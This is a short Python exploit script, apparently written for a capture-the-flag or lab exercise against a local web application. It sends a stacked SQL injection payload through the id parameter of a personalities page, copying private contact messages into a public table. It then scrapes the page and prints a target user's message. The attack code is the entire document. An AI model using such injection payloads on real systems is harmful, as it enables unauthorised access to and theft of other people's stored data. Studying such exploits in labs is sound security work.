import requests
import re
from bs4 import BeautifulSoup
import sys

if (len(sys.argv) > 1):
    addr = "0.0.0.0"
else:
    addr = "127.0.0.1"

data = "'; insert into personalities(name) select message from contact_messages where mail='james@bond.mi5"
data_urlencoded = "%27%3B%20insert%20into%20personalities(name)%20select%20message%20from%20contact_messages%20where%20mail%3D%27james%40bond.mi5"

#First, insert the message as a name in the personalities database
resp1 = requests.get('http://' + addr + '/personalities?id=%27%3B%20insert%20into%20personalities(name)%20select%20message%20from%20contact_messages%20where%20mail%3D%27james%40bond.mi5')

#Second, query the list of personalities again and recover the message of user 'james@bond.mi5' in the name field of the 21st entry in the database
resp2 = requests.get('http://' + addr + '/personalities')
html = resp2.text
soup = BeautifulSoup(html, "html.parser")
result = soup.findAll('a', attrs = {'class' : 'list-group-item'})
message = result[20].text[3:]
print (message)
